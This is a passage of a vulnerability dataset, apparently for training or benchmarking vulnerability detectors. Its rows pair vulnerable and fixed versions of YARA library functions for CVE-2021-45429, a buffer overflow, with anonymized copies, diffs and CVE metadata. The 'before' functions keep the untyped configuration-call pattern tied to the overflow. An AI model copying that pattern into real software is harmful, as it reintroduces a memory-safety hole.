}
if (VAR_1->entry_point == VAR_17)
{
YR_TRYCATCH(
!(VAR_1->flags & VAR_18),
{
if (VAR_1->flags & VAR_19)
VAR_1->entry_point = yr_get_entry_point_address(
VAR_16, VAR_7->size, VAR_7->base);
else
VAR_1->VAR_20 = yr_get_entry_point_offset(
VAR_16, VAR_7->size);
},
{});
}
YR_TRYCATCH(
!(VAR_1->flags & VAR_18),
{ VAR_9 = _yr_scanner_scan_mem_block(VAR_1, VAR_16, VAR_7); }",,"YR_API int yr_scanner_scan_mem_blocks(
    YR_SCANNER* scanner,
    YR_MEMORY_BLOCK_ITERATOR* iterator)
{
  YR_DEBUG_FPRINTF(2, stderr, ""+ %s() {\n"", __FUNCTION__);

  YR_RULES* rules;
  YR_RULE* rule;
  YR_MEMORY_BLOCK* block;

  int i, result = ERROR_SUCCESS;

  if (scanner->callback == NULL)
  {
    result = ERROR_CALLBACK_REQUIRED;
    goto _exit;
  }

  scanner->iterator = iterator;
  rules = scanner->rules;

  if (iterator->last_error == ERROR_BLOCK_NOT_READY)
  {
    // The caller is invoking yr_scanner_scan_mem_blocks again because the
    // previous call returned ERROR_BLOCK_NOT_READY.
    block = iterator->next(iterator);
  }
  else
  {
    // Create the notebook that will hold the YR_MATCH structures representing
    // each match found. This notebook will also contain snippets of the
    // matching data (the ""data"" field in YR_MATCH points to the snippet
    // corresponding to the match). Each notebook's page can store up to 1024
    // matches.
    uint32_t max_match_data;

    FAIL_ON_ERROR(
        yr_get_configuration_uint32(YR_CONFIG_MAX_MATCH_DATA, &max_match_data));

    result = yr_notebook_create(
        1024 * (sizeof(YR_MATCH) + max_match_data), &scanner->matches_notebook);

    if (result != ERROR_SUCCESS)
      goto _exit;

    yr_stopwatch_start(&scanner->stopwatch);

    block = iterator->first(iterator);
  }

  while (block != NULL)
  {
    const uint8_t* data = block->fetch_data(block);

    // fetch_data may fail and return NULL.
    if (data == NULL)
    {
      block = iterator->next(iterator);
      continue;
    }

    if (scanner->entry_point == YR_UNDEFINED)
    {
      YR_TRYCATCH(
          !(scanner->flags & SCAN_FLAGS_NO_TRYCATCH),
          {
            if (scanner->flags & SCAN_FLAGS_PROCESS_MEMORY)
              scanner->entry_point = yr_get_entry_point_address(
                  data, block->size, block->base);
            else
              scanner->entry_point = yr_get_entry_point_offset(
                  data, block->size);
          },
          {});
    }

    YR_TRYCATCH(
        !(scanner->flags & SCAN_FLAGS_NO_TRYCATCH),
        { result = _yr_scanner_scan_mem_block(scanner, data, block); }","YR_API VAR_0 yr_scanner_scan_mem_blocks(
    YR_SCANNER* VAR_1,
    YR_MEMORY_BLOCK_ITERATOR* VAR_2)
{
  YR_DEBUG_FPRINTF(2, VAR_3, ""+ %s() {\n"", VAR_4);

  YR_RULES* VAR_5;
  YR_RULE* VAR_6;
  YR_MEMORY_BLOCK* VAR_7;

  int VAR_8, VAR_9 = VAR_10;

  if (VAR_1->callback == NULL)
  {
    VAR_9 = VAR_11;
    goto _exit;
  }

  VAR_1->iterator = VAR_2;
  VAR_5 = VAR_1->rules;

  if (VAR_2->last_error == VAR_12)
  {
    /* COMMENT_0 */
    /* COMMENT_1 */
    VAR_7 = VAR_2->next(VAR_2);
  }
  else
  {
    /* COMMENT_2 */
    /* COMMENT_3 */
    /* COMMENT_4 */
    /* COMMENT_5 */
    /* COMMENT_6 */
    uint32_t VAR_13;

    FAIL_ON_ERROR(
        yr_get_configuration_uint32(VAR_14, &VAR_13));

    VAR_9 = yr_notebook_create(
        1024 * (sizeof(VAR_15) + VAR_13), &VAR_1->matches_notebook);

    if (VAR_9 != VAR_10)
      goto _exit;

    yr_stopwatch_start(&VAR_1->stopwatch);

    VAR_7 = VAR_2->first(VAR_2);
  }

  while (VAR_7 != NULL)
  {
    const uint8_t* VAR_16 = VAR_7->fetch_data(VAR_7);

    /* COMMENT_7 */
    if (VAR_16 == NULL)
    {
      VAR_7 = VAR_2->next(VAR_2);
      continue;
    }

    if (VAR_1->entry_point == VAR_17)
    {
      YR_TRYCATCH(
          !(VAR_1->flags & VAR_18),
          {
            if (VAR_1->flags & VAR_19)
              VAR_1->entry_point = yr_get_entry_point_address(
                  VAR_16, VAR_7->size, VAR_7->base);
            else
              VAR_1->VAR_20 = yr_get_entry_point_offset(
                  VAR_16, VAR_7->size);
          },
          {});
    }

    YR_TRYCATCH(
        !(VAR_1->flags & VAR_18),
        { VAR_9 = _yr_scanner_scan_mem_block(VAR_1, VAR_16, VAR_7); }",,"--- func_before
+++ func_after
@@ -35,7 +35,7 @@
     uint32_t max_match_data;
 
     FAIL_ON_ERROR(
-        yr_get_configuration(YR_CONFIG_MAX_MATCH_DATA, &max_match_data));
+        yr_get_configuration_uint32(YR_CONFIG_MAX_MATCH_DATA, &max_match_data));
 
     result = yr_notebook_create(
         1024 * (sizeof(YR_MATCH) + max_match_data), &scanner->matches_notebook);","{'deleted_lines': ['        yr_get_configuration(YR_CONFIG_MAX_MATCH_DATA, &max_match_data));'], 'added_lines': ['        yr_get_configuration_uint32(YR_CONFIG_MAX_MATCH_DATA, &max_match_data));']}",True,"A Buffer Overflow vulnerablity exists in VirusTotal YARA git commit: 605b2edf07ed8eb9a2c61ba22eb2e7c362f47ba7 via yr_set_configuration in yara/libyara/libyara.c, which could cause a Denial of Service.",5.5,MEDIUM,1,valid,2021-12-17T15:47:20Z,4
CVE-2021-45429,['CWE-120'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,VirusTotal/yara,"Fix issue #1616

This is a more comprehensive fix than #1617, it adds new functions to the API for getting/setting uint32 and uint64 settings.  Using these functions is preferable over calling `yr_(get|set)_configuration` directly.",b34b7e74c862c129b801832b6b85401fbada2b01,https://github.com/VirusTotal/yara/commit/b34b7e74c862c129b801832b6b85401fbada2b01,libyara/proc/openbsd.c,yr_process_get_next_memory_block,"YR_API YR_MEMORY_BLOCK* yr_process_get_next_memory_block(
YR_MEMORY_BLOCK_ITERATOR* iterator)
{
YR_PROC_ITERATOR_CTX* context = (YR_PROC_ITERATOR_CTX*) iterator->context;
YR_PROC_INFO* proc_info = (YR_PROC_INFO*) context->proc_info;
int mib[] = {CTL_KERN, KERN_PROC_VMMAP, proc_info->pid};
size_t len = sizeof(struct kinfo_vmentry);
iterator->last_error = ERROR_SUCCESS;
uint64_t current_begin = context->current_block.base +
context->current_block.size;
uint64_t max_process_memory_chunk;
yr_get_configuration(
YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, (void*) &max_process_memory_chunk);
if (proc_info->old_end <= current_begin)
{
if (sysctl(mib, 3, &proc_info->vm_entry, &len, NULL, 0) < 0)
return NULL;
if (proc_info->old_end == proc_info->vm_entry.kve_end)
return NULL;
current_begin = proc_info->vm_entry.kve_start;
proc_info->old_end = proc_info->vm_entry.kve_end;
proc_info->vm_entry.kve_start = proc_info->vm_entry.kve_start + 1;
}
context->current_block.base = current_begin;
context->current_block.size = yr_min(
proc_info->old_end - current_begin, max_process_memory_chunk);
assert(context->current_block.size > 0);
return &context->current_block;
}","YR_API VAR_0* yr_process_get_next_memory_block(
YR_MEMORY_BLOCK_ITERATOR* VAR_1)
{
YR_PROC_ITERATOR_CTX* VAR_2 = (YR_PROC_ITERATOR_CTX*) VAR_1->context;
YR_PROC_INFO* VAR_3 = (YR_PROC_INFO*) VAR_2->proc_info;
int VAR_4[] = {VAR_5, VAR_6, VAR_3->pid};
size_t VAR_7 = sizeof(struct kinfo_vmentry);
VAR_1->last_error = VAR_8;
uint64_t VAR_9 = VAR_2->current_block.base +
VAR_2->current_block.size;
uint64_t VAR_10;
yr_get_configuration(
VAR_11, (void*) &VAR_10);
if (VAR_3->old_end <= VAR_9)
{
if (sysctl(VAR_4, 3, &VAR_3->vm_entry, &VAR_7, NULL, 0) < 0)
return NULL;
if (VAR_3->old_end == VAR_3->vm_entry.kve_end)
return NULL;
VAR_9 = VAR_3->vm_entry.kve_start;
VAR_3->old_end = VAR_3->vm_entry.kve_end;
VAR_3->vm_entry.kve_start = VAR_3->vm_entry.kve_start + 1;
}
VAR_2->current_block.base = VAR_9;
VAR_2->current_block.size = yr_min(
VAR_3->old_end - VAR_9, VAR_10);
assert(VAR_2->current_block.size > 0);
return &VAR_2->current_block;
}",,"YR_API YR_MEMORY_BLOCK* yr_process_get_next_memory_block(
    YR_MEMORY_BLOCK_ITERATOR* iterator)
{
  YR_PROC_ITERATOR_CTX* context = (YR_PROC_ITERATOR_CTX*) iterator->context;
  YR_PROC_INFO* proc_info = (YR_PROC_INFO*) context->proc_info;

  int mib[] = {CTL_KERN, KERN_PROC_VMMAP, proc_info->pid};
  size_t len = sizeof(struct kinfo_vmentry);

  iterator->last_error = ERROR_SUCCESS;

  uint64_t current_begin = context->current_block.base +
                           context->current_block.size;

  uint64_t max_process_memory_chunk;

  yr_get_configuration_uint64(
      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, &max_process_memory_chunk);

  if (proc_info->old_end <= current_begin)
  {
    if (sysctl(mib, 3, &proc_info->vm_entry, &len, NULL, 0) < 0)
      return NULL;

    // no more blocks
    if (proc_info->old_end == proc_info->vm_entry.kve_end)
      return NULL;

    current_begin = proc_info->vm_entry.kve_start;
    proc_info->old_end = proc_info->vm_entry.kve_end;

    proc_info->vm_entry.kve_start = proc_info->vm_entry.kve_start + 1;
  }

  context->current_block.base = current_begin;
  context->current_block.size = yr_min(
      proc_info->old_end - current_begin, max_process_memory_chunk);

  assert(context->current_block.size > 0);

  return &context->current_block;
}","YR_API VAR_0* yr_process_get_next_memory_block(
    YR_MEMORY_BLOCK_ITERATOR* VAR_1)
{
  YR_PROC_ITERATOR_CTX* VAR_2 = (YR_PROC_ITERATOR_CTX*) VAR_1->context;
  YR_PROC_INFO* VAR_3 = (YR_PROC_INFO*) VAR_2->proc_info;

  int VAR_4[] = {VAR_5, VAR_6, VAR_3->pid};
  size_t VAR_7 = sizeof(struct kinfo_vmentry);

  VAR_1->last_error = VAR_8;

  uint64_t VAR_9 = VAR_2->current_block.base +
                           VAR_2->current_block.size;

  uint64_t VAR_10;

  yr_get_configuration_uint64(
      VAR_11, &VAR_10);

  if (VAR_3->old_end <= VAR_9)
  {
    if (sysctl(VAR_4, 3, &VAR_3->vm_entry, &VAR_7, NULL, 0) < 0)
      return NULL;

    /* COMMENT_0 */
    if (VAR_3->old_end == VAR_3->vm_entry.kve_end)
      return NULL;

    VAR_9 = VAR_3->vm_entry.kve_start;
    VAR_3->old_end = VAR_3->vm_entry.kve_end;

    VAR_3->vm_entry.kve_start = VAR_3->vm_entry.kve_start + 1;
  }

  VAR_2->current_block.base = VAR_9;
  VAR_2->current_block.size = yr_min(
      VAR_3->old_end - VAR_9, VAR_10);

  assert(VAR_2->current_block.size > 0);

  return &VAR_2->current_block;
}",,"--- func_before
+++ func_after
@@ -14,8 +14,8 @@
 
   uint64_t max_process_memory_chunk;
 
-  yr_get_configuration(
-      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, (void*) &max_process_memory_chunk);
+  yr_get_configuration_uint64(
+      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, &max_process_memory_chunk);
 
   if (proc_info->old_end <= current_begin)
   {","{'deleted_lines': ['  yr_get_configuration(', '      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, (void*) &max_process_memory_chunk);'], 'added_lines': ['  yr_get_configuration_uint64(', '      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, &max_process_memory_chunk);']}",True,"A Buffer Overflow vulnerablity exists in VirusTotal YARA git commit: 605b2edf07ed8eb9a2c61ba22eb2e7c362f47ba7 via yr_set_configuration in yara/libyara/libyara.c, which could cause a Denial of Service.",5.5,MEDIUM,1,valid,2021-12-17T15:47:20Z,4
CVE-2021-45429,['CWE-120'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,VirusTotal/yara,"Fix issue #1616

This is a more comprehensive fix than #1617, it adds new functions to the API for getting/setting uint32 and uint64 settings.  Using these functions is preferable over calling `yr_(get|set)_configuration` directly.",b34b7e74c862c129b801832b6b85401fbada2b01,https://github.com/VirusTotal/yara/commit/b34b7e74c862c129b801832b6b85401fbada2b01,cli/yarac.c,_tmain,"int _tmain(int argc, const char_t** argv)
{
COMPILER_RESULTS cr;
YR_COMPILER* compiler = NULL;
YR_RULES* rules = NULL;
int result;
argc = args_parse(options, argc, argv);
if (show_version)
{
printf(""%s\n"", YR_VERSION);
return EXIT_SUCCESS;
}
if (show_help)
{
printf(""%s\n\n"", USAGE_STRING);
args_print_usage(options, 40);
printf(""\nSend bug reports and suggestions to: vmalvarez@virustotal.com\n"");
return EXIT_SUCCESS;
}
if (argc < 2)
{
fprintf(stderr, ""yarac: wrong number of arguments\n"");
fprintf(stderr, ""%s\n\n"", USAGE_STRING);
fprintf(stderr, ""Try `--help` for more options\n"");
exit_with_code(EXIT_FAILURE);
}
if (yr_initialize() != ERROR_SUCCESS)
exit_with_code(EXIT_FAILURE);
if (yr_compiler_create(&compiler) != ERROR_SUCCESS)
exit_with_code(EXIT_FAILURE);
if (define_external_variables(ext_vars, NULL, compiler) != ERROR_SUCCESS)
exit_with_code(EXIT_FAILURE);
if (atom_quality_table != NULL)
{
result = yr_compiler_load_atom_quality_table(
compiler, atom_quality_table, 0);
if (result != ERROR_SUCCESS)
{
fprintf(stderr, ""error loading atom quality table\n"");
exit_with_code(EXIT_FAILURE);
}
}
cr.errors = 0;
cr.warnings = 0;
yr_set_configuration(YR_CONFIG_MAX_STRINGS_PER_RULE, &max_strings_per_rule);
yr_compiler_set_callback(compiler, report_error, &cr);
if (!compile_files(compiler, argc, argv))
exit_with_code(EXIT_FAILURE);
if (cr.errors > 0)
exit_with_code(EXIT_FAILURE);
if (fail_on_warnings && cr.warnings > 0)
exit_with_code(EXIT_FAILURE);
result = yr_compiler_get_rules(compiler, &rules);
if (result != ERROR_SUCCESS)
{
fprintf(stderr, ""error: %d\n"", result);
exit_with_code(EXIT_FAILURE);
}
FILE* fh = _tfopen(argv[argc - 1], _T(""wb""));
if (fh != NULL)
{
YR_STREAM stream;
stream.user_data = fh;
stream.write = (YR_STREAM_WRITE_FUNC) fwrite;
result = yr_rules_save_stream(rules, &stream);
fclose(fh);
}
if (result != ERROR_SUCCESS)
{
fprintf(stderr, ""error: %d\n"", result);
exit_with_code(EXIT_FAILURE);
}
result = EXIT_SUCCESS;
_exit:
if (compiler != NULL)
yr_compiler_destroy(compiler);
if (rules != NULL)
yr_rules_destroy(rules);
yr_finalize();
args_free(options);
return result;
}","int _tmain(int VAR_0, const char_t** VAR_1)
{
COMPILER_RESULTS VAR_2;
YR_COMPILER* VAR_3 = NULL;
YR_RULES* VAR_4 = NULL;
int VAR_5;
VAR_0 = args_parse(VAR_6, VAR_0, VAR_1);
if (VAR_7)
{
printf(""%s\n"", VAR_8);
return VAR_9;
}
if (VAR_10)
{
printf(""%s\n\n"", VAR_11);
args_print_usage(VAR_6, 40);
printf(""\nSend bug reports and suggestions to: vmalvarez@virustotal.com\n"");
return VAR_9;
}
if (VAR_0 < 2)
{
fprintf(VAR_12, ""yarac: wrong number of arguments\n"");
fprintf(VAR_12, ""%s\n\n"", VAR_11);
fprintf(VAR_12, ""Try `--help` for more options\n"");
exit_with_code(VAR_13);
}
if (yr_initialize() != VAR_14)
exit_with_code(VAR_13);
if (yr_compiler_create(&VAR_3) != VAR_14)
exit_with_code(VAR_13);
if (define_external_variables(VAR_15, NULL, VAR_3) != VAR_14)
exit_with_code(VAR_13);
if (VAR_16 != NULL)
{
VAR_5 = yr_compiler_load_atom_quality_table(
VAR_3, VAR_16, 0);
if (VAR_5 != VAR_14)
{
fprintf(VAR_12, ""error loading atom quality table\n"");
exit_with_code(VAR_13);
}
}
VAR_2.errors = 0;
VAR_2.warnings = 0;
yr_set_configuration(VAR_17, &VAR_18);
yr_compiler_set_callback(VAR_3, VAR_19, &VAR_2);
if (!compile_files(VAR_3, VAR_0, VAR_1))
exit_with_code(VAR_13);
if (VAR_2.errors > 0)
exit_with_code(VAR_13);
if (VAR_20 && VAR_2.warnings > 0)
exit_with_code(VAR_13);
VAR_5 = yr_compiler_get_rules(VAR_3, &VAR_4);
if (VAR_5 != VAR_14)
{
fprintf(VAR_12, ""error: %d\n"", VAR_5);
exit_with_code(VAR_13);
}
FILE* VAR_21 = _tfopen(VAR_1[VAR_0 - 1], _T(""wb""));
if (VAR_21 != NULL)
{
YR_STREAM VAR_22;
VAR_22.user_data = VAR_21;
VAR_22.write = (YR_STREAM_WRITE_FUNC) VAR_23;
VAR_5 = yr_rules_save_stream(VAR_4, &VAR_22);
fclose(VAR_21);
}
if (VAR_5 != VAR_14)
{
fprintf(VAR_12, ""error: %d\n"", VAR_5);
exit_with_code(VAR_13);
}
VAR_5 = VAR_9;
_exit:
if (VAR_3 != NULL)
yr_compiler_destroy(VAR_3);
if (VAR_4 != NULL)
yr_rules_destroy(VAR_4);
yr_finalize();
args_free(VAR_6);
return VAR_5;
}",VirusTotal/yara/b34b7e74c862c129b801832b6b85401fbada2b01/yarac.c/vul/before/0.json,"int _tmain(int argc, const char_t** argv)
{
  COMPILER_RESULTS cr;

  YR_COMPILER* compiler = NULL;
  YR_RULES* rules = NULL;

  int result;

  argc = args_parse(options, argc, argv);

  if (show_version)
  {
    printf(""%s\n"", YR_VERSION);
    return EXIT_SUCCESS;
  }

  if (show_help)
  {
    printf(""%s\n\n"", USAGE_STRING);

    args_print_usage(options, 40);
    printf(""\nSend bug reports and suggestions to: vmalvarez@virustotal.com\n"");

    return EXIT_SUCCESS;
  }

  if (argc < 2)
  {
    fprintf(stderr, ""yarac: wrong number of arguments\n"");
    fprintf(stderr, ""%s\n\n"", USAGE_STRING);
    fprintf(stderr, ""Try `--help` for more options\n"");

    exit_with_code(EXIT_FAILURE);
  }

  if (yr_initialize() != ERROR_SUCCESS)
    exit_with_code(EXIT_FAILURE);

  if (yr_compiler_create(&compiler) != ERROR_SUCCESS)
    exit_with_code(EXIT_FAILURE);

  if (define_external_variables(ext_vars, NULL, compiler) != ERROR_SUCCESS)
    exit_with_code(EXIT_FAILURE);

  if (atom_quality_table != NULL)
  {
    result = yr_compiler_load_atom_quality_table(
        compiler, atom_quality_table, 0);

    if (result != ERROR_SUCCESS)
    {
      fprintf(stderr, ""error loading atom quality table\n"");
      exit_with_code(EXIT_FAILURE);
    }
  }

  cr.errors = 0;
  cr.warnings = 0;

  yr_set_configuration_uint32(
      YR_CONFIG_MAX_STRINGS_PER_RULE, max_strings_per_rule);

  yr_compiler_set_callback(compiler, report_error, &cr);

  if (!compile_files(compiler, argc, argv))
    exit_with_code(EXIT_FAILURE);

  if (cr.errors > 0)
    exit_with_code(EXIT_FAILURE);

  if (fail_on_warnings && cr.warnings > 0)
    exit_with_code(EXIT_FAILURE);

  result = yr_compiler_get_rules(compiler, &rules);

  if (result != ERROR_SUCCESS)
  {
    fprintf(stderr, ""error: %d\n"", result);
    exit_with_code(EXIT_FAILURE);
  }

  // Not using yr_rules_save because it does not have support for unicode
  // file names. Instead use open _tfopen for openning the file and
  // yr_rules_save_stream for writing the rules to it.

  FILE* fh = _tfopen(argv[argc - 1], _T(""wb""));

  if (fh != NULL)
  {
    YR_STREAM stream;

    stream.user_data = fh;
    stream.write = (YR_STREAM_WRITE_FUNC) fwrite;

    result = yr_rules_save_stream(rules, &stream);

    fclose(fh);
  }

  if (result != ERROR_SUCCESS)
  {
    fprintf(stderr, ""error: %d\n"", result);
    exit_with_code(EXIT_FAILURE);
  }

  result = EXIT_SUCCESS;

_exit:

  if (compiler != NULL)
    yr_compiler_destroy(compiler);

  if (rules != NULL)
    yr_rules_destroy(rules);

  yr_finalize();

  args_free(options);

  return result;
}","int _tmain(int VAR_0, const char_t** VAR_1)
{
  COMPILER_RESULTS VAR_2;

  YR_COMPILER* VAR_3 = NULL;
  YR_RULES* VAR_4 = NULL;

  int VAR_5;

  VAR_0 = args_parse(VAR_6, VAR_0, VAR_1);

  if (VAR_7)
  {
    printf(""%s\n"", VAR_8);
    return VAR_9;
  }

  if (VAR_10)
  {
    printf(""%s\n\n"", VAR_11);

    args_print_usage(VAR_6, 40);
    printf(""\nSend bug reports and suggestions to: vmalvarez@virustotal.com\n"");

    return VAR_9;
  }

  if (VAR_0 < 2)
  {
    fprintf(VAR_12, ""yarac: wrong number of arguments\n"");
    fprintf(VAR_12, ""%s\n\n"", VAR_11);
    fprintf(VAR_12, ""Try `--help` for more options\n"");

    exit_with_code(VAR_13);
  }

  if (yr_initialize() != VAR_14)
    exit_with_code(VAR_13);

  if (yr_compiler_create(&VAR_3) != VAR_14)
    exit_with_code(VAR_13);

  if (define_external_variables(VAR_15, NULL, VAR_3) != VAR_14)
    exit_with_code(VAR_13);

  if (VAR_16 != NULL)
  {
    VAR_5 = yr_compiler_load_atom_quality_table(
        VAR_3, VAR_16, 0);

    if (VAR_5 != VAR_14)
    {
      fprintf(VAR_12, ""error loading atom quality table\n"");
      exit_with_code(VAR_13);
    }
  }

  VAR_2.errors = 0;
  VAR_2.warnings = 0;

  yr_set_configuration_uint32(
      VAR_17, VAR_18);

  yr_compiler_set_callback(VAR_3, VAR_19, &VAR_2);

  if (!compile_files(VAR_3, VAR_0, VAR_1))
    exit_with_code(VAR_13);

  if (VAR_2.errors > 0)
    exit_with_code(VAR_13);

  if (VAR_20 && VAR_2.warnings > 0)
    exit_with_code(VAR_13);

  VAR_5 = yr_compiler_get_rules(VAR_3, &VAR_4);

  if (VAR_5 != VAR_14)
  {
    fprintf(VAR_12, ""error: %d\n"", VAR_5);
    exit_with_code(VAR_13);
  }

  /* COMMENT_0 */
  /* COMMENT_1 */
  /* COMMENT_2 */

  FILE* VAR_21 = _tfopen(VAR_1[VAR_0 - 1], _T(""wb""));

  if (VAR_21 != NULL)
  {
    YR_STREAM VAR_22;

    VAR_22.user_data = VAR_21;
    VAR_22.write = (YR_STREAM_WRITE_FUNC) VAR_23;

    VAR_5 = yr_rules_save_stream(VAR_4, &VAR_22);

    fclose(VAR_21);
  }

  if (VAR_5 != VAR_14)
  {
    fprintf(VAR_12, ""error: %d\n"", VAR_5);
    exit_with_code(VAR_13);
  }

  VAR_5 = VAR_9;

_exit:

  if (VAR_3 != NULL)
    yr_compiler_destroy(VAR_3);

  if (VAR_4 != NULL)
    yr_rules_destroy(VAR_4);

  yr_finalize();

  args_free(VAR_6);

  return VAR_5;
}",VirusTotal/yara/b34b7e74c862c129b801832b6b85401fbada2b01/yarac.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -58,7 +58,9 @@
   cr.errors = 0;
   cr.warnings = 0;
 
-  yr_set_configuration(YR_CONFIG_MAX_STRINGS_PER_RULE, &max_strings_per_rule);
+  yr_set_configuration_uint32(
+      YR_CONFIG_MAX_STRINGS_PER_RULE, max_strings_per_rule);
+
   yr_compiler_set_callback(compiler, report_error, &cr);
 
   if (!compile_files(compiler, argc, argv))","{'deleted_lines': ['  yr_set_configuration(YR_CONFIG_MAX_STRINGS_PER_RULE, &max_strings_per_rule);'], 'added_lines': ['  yr_set_configuration_uint32(', '      YR_CONFIG_MAX_STRINGS_PER_RULE, max_strings_per_rule);', '']}",True,"A Buffer Overflow vulnerablity exists in VirusTotal YARA git commit: 605b2edf07ed8eb9a2c61ba22eb2e7c362f47ba7 via yr_set_configuration in yara/libyara/libyara.c, which could cause a Denial of Service.",5.5,MEDIUM,1,valid,2021-12-17T15:47:20Z,4
CVE-2021-45429,['CWE-120'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,VirusTotal/yara,"Fix issue #1616

This is a more comprehensive fix than #1617, it adds new functions to the API for getting/setting uint32 and uint64 settings.  Using these functions is preferable over calling `yr_(get|set)_configuration` directly.",b34b7e74c862c129b801832b6b85401fbada2b01,https://github.com/VirusTotal/yara/commit/b34b7e74c862c129b801832b6b85401fbada2b01,libyara/proc/mach.c,yr_process_get_next_memory_block,"YR_API YR_MEMORY_BLOCK* yr_process_get_next_memory_block(
YR_MEMORY_BLOCK_ITERATOR* iterator)
{
YR_PROC_ITERATOR_CTX* context = (YR_PROC_ITERATOR_CTX*) iterator->context;
YR_PROC_INFO* proc_info = context->proc_info;
kern_return_t kr;
mach_msg_type_number_t info_count;
mach_port_t object;
vm_region_basic_info_data_64_t info;
vm_size_t size = 0;
uint64_t current_begin = (vm_address_t) context->current_block.base +
context->current_block.size;
vm_address_t address = current_begin;
uint64_t max_process_memory_chunk;
yr_get_configuration(
YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, (void*) &max_process_memory_chunk);
iterator->last_error = ERROR_SUCCESS;
do
{
info_count = VM_REGION_BASIC_INFO_COUNT_64;
kr = vm_region_64(
proc_info->task,
&address,
&size,
VM_REGION_BASIC_INFO,
(vm_region_info_t) &info,
&info_count,
&object);
if (kr == KERN_SUCCESS)
{
size_t chunk_size = size - (size_t) (current_begin - address);
if (((uint64_t) chunk_size) > max_process_memory_chunk)
{
chunk_size = (size_t) max_process_memory_chunk;
}
context->current_block.base = (size_t) current_begin;
context->current_block.size = chunk_size;
return &context->current_block;
}
current_begin = address;
} while (kr != KERN_INVALID_ADDRESS);
return NULL;
}","YR_API VAR_0* yr_process_get_next_memory_block(
YR_MEMORY_BLOCK_ITERATOR* VAR_1)
{
YR_PROC_ITERATOR_CTX* VAR_2 = (YR_PROC_ITERATOR_CTX*) VAR_1->context;
YR_PROC_INFO* VAR_3 = VAR_2->proc_info;
kern_return_t VAR_4;
mach_msg_type_number_t VAR_5;
mach_port_t VAR_6;
vm_region_basic_info_data_64_t VAR_7;
vm_size_t VAR_8 = 0;
uint64_t VAR_9 = (vm_address_t) VAR_2->current_block.base +
VAR_2->current_block.size;
vm_address_t VAR_10 = VAR_9;
uint64_t VAR_11;
yr_get_configuration(
VAR_12, (void*) &VAR_11);
VAR_1->last_error = VAR_13;
do
{
VAR_5 = VAR_14;
VAR_4 = vm_region_64(
VAR_3->task,
&VAR_10,
&VAR_8,
VAR_15,
(VAR_16) &VAR_7,
&VAR_5,
&VAR_6);
if (VAR_4 == VAR_17)
{
size_t VAR_18 = VAR_8 - (size_t) (VAR_9 - VAR_10);
if (((uint64_t) VAR_18) > VAR_11)
{
VAR_18 = (size_t) VAR_11;
}
VAR_2->current_block.base = (size_t) VAR_9;
VAR_2->current_block.size = VAR_18;
return &VAR_2->current_block;
}
VAR_9 = VAR_10;
} while (VAR_4 != VAR_19);
return NULL;
}",,"YR_API YR_MEMORY_BLOCK* yr_process_get_next_memory_block(
    YR_MEMORY_BLOCK_ITERATOR* iterator)
{
  YR_PROC_ITERATOR_CTX* context = (YR_PROC_ITERATOR_CTX*) iterator->context;
  YR_PROC_INFO* proc_info = context->proc_info;

  kern_return_t kr;
  mach_msg_type_number_t info_count;
  mach_port_t object;
  vm_region_basic_info_data_64_t info;
  vm_size_t size = 0;

  uint64_t current_begin = (vm_address_t) context->current_block.base +
                           context->current_block.size;
  vm_address_t address = current_begin;
  uint64_t max_process_memory_chunk;

  yr_get_configuration_uint64(
      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, &max_process_memory_chunk);

  iterator->last_error = ERROR_SUCCESS;

  do
  {
    info_count = VM_REGION_BASIC_INFO_COUNT_64;

    kr = vm_region_64(
        proc_info->task,
        &address,
        &size,
        VM_REGION_BASIC_INFO,
        (vm_region_info_t) &info,
        &info_count,
        &object);

    if (kr == KERN_SUCCESS)
    {
      size_t chunk_size = size - (size_t) (current_begin - address);

      if (((uint64_t) chunk_size) > max_process_memory_chunk)
      {
        chunk_size = (size_t) max_process_memory_chunk;
      }

      context->current_block.base = (size_t) current_begin;
      context->current_block.size = chunk_size;

      return &context->current_block;
    }

    current_begin = address;

  } while (kr != KERN_INVALID_ADDRESS);

  return NULL;
}","YR_API VAR_0* yr_process_get_next_memory_block(
    YR_MEMORY_BLOCK_ITERATOR* VAR_1)
{
  YR_PROC_ITERATOR_CTX* VAR_2 = (YR_PROC_ITERATOR_CTX*) VAR_1->context;
  YR_PROC_INFO* VAR_3 = VAR_2->proc_info;

  kern_return_t VAR_4;
  mach_msg_type_number_t VAR_5;
  mach_port_t VAR_6;
  vm_region_basic_info_data_64_t VAR_7;
  vm_size_t VAR_8 = 0;

  uint64_t VAR_9 = (vm_address_t) VAR_2->current_block.base +
                           VAR_2->current_block.size;
  vm_address_t VAR_10 = VAR_9;
  uint64_t VAR_11;

  yr_get_configuration_uint64(
      VAR_12, &VAR_11);

  VAR_1->last_error = VAR_13;

  do
  {
    VAR_5 = VAR_14;

    VAR_4 = vm_region_64(
        VAR_3->task,
        &VAR_10,
        &VAR_8,
        VAR_15,
        (VAR_16) &VAR_7,
        &VAR_5,
        &VAR_6);

    if (VAR_4 == VAR_17)
    {
      size_t VAR_18 = VAR_8 - (size_t) (VAR_9 - VAR_10);

      if (((uint64_t) VAR_18) > VAR_11)
      {
        VAR_18 = (size_t) VAR_11;
      }

      VAR_2->current_block.base = (size_t) VAR_9;
      VAR_2->current_block.size = VAR_18;

      return &VAR_2->current_block;
    }

    VAR_9 = VAR_10;

  } while (VAR_4 != VAR_19);

  return NULL;
}",,"--- func_before
+++ func_after
@@ -15,8 +15,8 @@
   vm_address_t address = current_begin;
   uint64_t max_process_memory_chunk;
 
-  yr_get_configuration(
-      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, (void*) &max_process_memory_chunk);
+  yr_get_configuration_uint64(
+      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, &max_process_memory_chunk);
 
   iterator->last_error = ERROR_SUCCESS;
